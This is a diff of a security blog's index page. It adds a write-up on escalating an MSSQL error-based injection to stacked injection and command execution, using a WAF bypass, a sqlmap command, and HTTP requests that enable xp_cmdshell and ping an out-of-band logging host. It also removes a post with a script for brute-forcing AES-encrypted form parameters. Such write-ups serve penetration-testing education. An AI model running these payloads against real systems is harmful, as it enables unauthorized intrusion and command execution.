@@ -188,6 +188,116 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/07/%E4%BB%8EMSSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%B0%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="sing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/04/07/%E4%BB%8EMSSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%B0%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">从MSSQL报错注入到堆叠注入，实现命令执行</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2022-04-07 20:44:36 / Modified: 22:25:26" itemprop="dateCreated datePublished" datetime="2022-04-07T20:44:36+08:00">2022-04-07</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQLi/" itemprop="url" rel="index"><span itemprop="name">SQLi</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="从MSSQL报错注入到堆叠注入，实现命令执行"><a href="#从MSSQL报错注入到堆叠注入，实现命令执行" class="headerlink" title="从MSSQL报错注入到堆叠注入，实现命令执行"></a>从MSSQL报错注入到堆叠注入，实现命令执行</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>近日对一已授权的站点进行渗透测试，随手一个单引号，发现存在SQL报错信息。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage1.png" alt="图一"></p>
+<h2 id="0x02-报错注入"><a href="#0x02-报错注入" class="headerlink" title="0x02-报错注入"></a>0x02-报错注入</h2><p>尝试报错注入，发现系统存在两层防御，一个是云WAF，一个代码防御。开始使用分块传输绕过云WAF（使用的是Burpsuite插件：<code>chunked-coding-converter-0.4.0</code>），确实可以绕过。但后面使用 <code>select</code> 语句的时候，被后端代码拦截了，提示非法访问。后续修改 POST 数据 <code>Content-Type</code> 为 JSON 格式后，直接绕过云 WAF 以及后端代码两层防御。具体绕过测试结果如下图。</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage2.png" alt="图二"></p>
+<p>根据已知信息，使用 SQLMAP 根据进行数据提取。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r sql.txt <span class="comment">--level 5 --risk 2 --batch --dbms=&quot;Microsoft SQL Server&quot; --technique=E --prefix=&quot;)&quot; --dbs</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage3.png" alt="图三"></p>
+<h2 id="0x03-升级为堆叠注入"><a href="#0x03-升级为堆叠注入" class="headerlink" title="0x03-升级为堆叠注入"></a>0x03-升级为堆叠注入</h2><p>猜想该注入点支持堆叠注入。但直接使用 <code>1);select 1</code> ，服务器是报错的。所以必须知道原始的查询语句才可以正确闭合。</p>
+<h3 id="查询正在执行的语句"><a href="#查询正在执行的语句" class="headerlink" title="查询正在执行的语句"></a>查询正在执行的语句</h3><p>每个数据库就有一个默认表存储着正在执行的SQL语句，MYSQL 正在执行查询的SQL语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>
+
+<p>MSSQL 为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">der.[session_id],der.[blocking_session_id],</span><br><span class="line">sp.lastwaittype,sp.hostname,sp.program_name,sp.loginame,</span><br><span class="line">der.[start_time] <span class="keyword">AS</span> <span class="string">&#x27;开始时间&#x27;</span>,</span><br><span class="line">der.[status] <span class="keyword">AS</span> <span class="string">&#x27;状态&#x27;</span>,</span><br><span class="line">dest.[text] <span class="keyword">AS</span> <span class="string">&#x27;sql语句&#x27;</span>,</span><br><span class="line">DB_NAME(der.[database_id]) <span class="keyword">AS</span> <span class="string">&#x27;数据库名&#x27;</span>,</span><br><span class="line">der.[wait_type] <span class="keyword">AS</span> <span class="string">&#x27;等待资源类型&#x27;</span>,</span><br><span class="line">der.[wait_time] <span class="keyword">AS</span> <span class="string">&#x27;等待时间&#x27;</span>,</span><br><span class="line">der.[wait_resource] <span class="keyword">AS</span> <span class="string">&#x27;等待的资源&#x27;</span>,</span><br><span class="line">der.[logical_reads] <span class="keyword">AS</span> <span class="string">&#x27;逻辑读次数&#x27;</span></span><br><span class="line"><span class="keyword">FROM</span> sys.[dm_exec_requests] <span class="keyword">AS</span> der</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> master.dbo.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">ON</span> der.session_id<span class="operator">=</span>sp.spid</span><br><span class="line"><span class="keyword">CROSS</span> APPLY  sys.[dm_exec_sql_text](der.[sql_handle]) <span class="keyword">AS</span> dest</span><br><span class="line"><span class="comment">--WHERE [session_id]&gt;50 AND session_id&lt;&gt;@@SPID</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> der.[session_id]</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<p>简化后为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1</span> dest.[text] <span class="keyword">AS</span> <span class="string">&#x27;sql&#x27;</span> <span class="keyword">FROM</span> sys.[dm_exec_requests] <span class="keyword">AS</span> der <span class="keyword">INNER</span> <span class="keyword">JOIN</span> master.dbo.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">ON</span> der.session_id<span class="operator">=</span>sp.spid <span class="keyword">CROSS</span> APPLY  sys.[dm_exec_sql_text](der.[sql_handle]) <span class="keyword">AS</span> dest <span class="keyword">ORDER</span> <span class="keyword">BY</span> der.[session_id])</span><br></pre></td></tr></table></figure>
+
+<p>正在执行的SQL语句原型，如下图所示：</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage4.png" alt="图四"></p>
+<blockquote>
+<p>By the way：关于获取 SQL 原始语句将 <strong>“布尔盲注”</strong> 升级为 <strong>“UNION 注入”</strong> 的更多内容详见下文：<a target="_blank" rel="noopener" href="https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f">https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f</a></p>
+</blockquote>
+<p>闭合原始sql语句，进行堆叠注入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 开启 xp_cmdshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/马赛克</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>马赛克:8082</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>128</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://马赛克:8082</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://马赛克:8082/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>马赛克</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-haxe">&#123;<span class="string">&quot;ids&quot;</span>:<span class="type"></span>&quot;<span class="number">111</span>);EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;SELECT 马赛克 FROM dbo.马赛克 WHERE x IN (<span class="number">111</span><span class="string">&quot;&#125;</span></span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 执行 ping 命令</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/马赛克</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>马赛克:8082</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>128</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://马赛克:8082</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://马赛克:8082/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>马赛克</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-n1ql">&#123;&quot;ids&quot;:&quot;111);exec master..xp_cmdshell &#x27;ping bf5af7e2005beb3706534f7b0ab4.ns.pingb.in&#x27;;<span class="keyword">SELECT</span> 马赛克 <span class="keyword">FROM</span> dbo.马赛克 <span class="keyword">WHERE</span> x <span class="keyword">IN</span> (<span class="number">111</span><span class="string">&quot;&#125;</span></span></span><br></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220407203229.png" alt="图五"></p>
+<h1 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04-其他"></a>0x04-其他</h1><p><strong>查询执行过的 sql 语句</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 来自 https://www.cnblogs.com/blogcore/p/12467024.html</span></span><br><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1000</span> </span><br><span class="line">       ST.text <span class="keyword">AS</span> <span class="string">&#x27;执行的SQL语句&#x27;</span>,</span><br><span class="line">       QS.execution_count <span class="keyword">AS</span> <span class="string">&#x27;执行次数&#x27;</span>,</span><br><span class="line">       QS.total_elapsed_time <span class="keyword">AS</span> <span class="string">&#x27;耗时&#x27;</span>,</span><br><span class="line">       QS.total_logical_reads <span class="keyword">AS</span> <span class="string">&#x27;逻辑读取次数&#x27;</span>,</span><br><span class="line">       QS.total_logical_writes <span class="keyword">AS</span> <span class="string">&#x27;逻辑写入次数&#x27;</span>,</span><br><span class="line">       QS.total_physical_reads <span class="keyword">AS</span> <span class="string">&#x27;物理读取次数&#x27;</span>,       </span><br><span class="line">       QS.creation_time <span class="keyword">AS</span> <span class="string">&#x27;执行时间&#x27;</span> ,  </span><br><span class="line">       QS.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span>   sys.dm_exec_query_stats QS</span><br><span class="line">       <span class="keyword">CROSS</span> APPLY </span><br><span class="line">sys.dm_exec_sql_text(QS.sql_handle) ST</span><br><span class="line"><span class="keyword">WHERE</span>  QS.creation_time <span class="keyword">BETWEEN</span> <span class="string">&#x27;2015-08-01 00:00:00&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2015-09-02 11:00:00&#x27;</span> </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">     QS.total_elapsed_time <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>简化：去重 + 只取一个结果</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> TOP <span class="number">1</span> <span class="keyword">SQL</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> ST.text <span class="keyword">AS</span> <span class="string">&#x27;SQL&#x27;</span> <span class="keyword">FROM</span> sys.dm_exec_query_stats QS <span class="keyword">CROSS</span> APPLY sys.dm_exec_sql_text(QS.sql_handle) ST) A <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">SQL</span> <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/29/XXE%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1892,78 +2002,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="sing">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="sing's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/" class="post-title-link" itemprop="url">暴力破解之前端AES加密</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2022-03-18 11:50:23 / Modified: 22:15:46" itemprop="dateCreated datePublished" datetime="2022-03-18T11:50:23+08:00">2022-03-18</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>某次测试中遇到一个信息泄露漏洞。页面提供一个查询功能，用户需要填写两个或三个参数值，且参数值正确才能返回相关信息。在测试中，发现仅需提供一个参数值即可以返回相关信息。如在提供<em><strong>姓名输入框</strong></em>中填入：“吴翠”，即可返回“吴翠”的相关信息。</p>
-<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318120459.png"></p>
-<h2 id="0x02-AES加密的参数"><a href="#0x02-AES加密的参数" class="headerlink" title="0x02-AES加密的参数"></a>0x02-AES加密的参数</h2><p>测试过程中，发现参数值经过加密，翻查JS文件，确认是AES加密。<br>一开始的想法是使用 Burpsuite 的 <code>JS Rainbow</code> 插件加载JS文件，自动执行加密函数加密参数值进行爆破，后发现导入字典测试的时候，由于字典内容为中文，会导致加密结果与预期不一致，后端无法解析加密后的数据，导致查询失败。<br>后续尝试使用 <code>BurpCrypto</code>、<code>AES KILLER</code>等 Burpsuite 插件时均与上面情况一样，中文内容加密与预期不一致。估计是由于 Burpsuite 软件自身问题。<br>再后使用 python 写个小程序，将字典加密，将加密结果作为字典导入 Burpsuite 爆破才成功。</p>
-<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318122718.png"></p>
-<p><strong>加密小程序源代码</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">b&#x27;FC5E8DF8BB4A2F78&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = <span class="string">b&#x27;!1@2#3$4%5^6&amp;7*8&#x27;</span></span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    padtext=pad(text,<span class="number">16</span>,style=<span class="string">&#x27;pkcs7&#x27;</span>)</span><br><span class="line">    cipherText=cryptos.encrypt(padtext)</span><br><span class="line">    <span class="keyword">return</span> base64.encodebytes(cipherText)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;500.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> fs.readlines():</span><br><span class="line">            name = <span class="built_in">bytes</span>(line.strip(),encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">            e = encrypt(name)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(e.strip(), encoding = <span class="string">&quot;utf-8&quot;</span>))</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2032,7 +2070,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2070,7 +2108,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2022</span>
+  <span itemprop="copyrightYear">2023</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
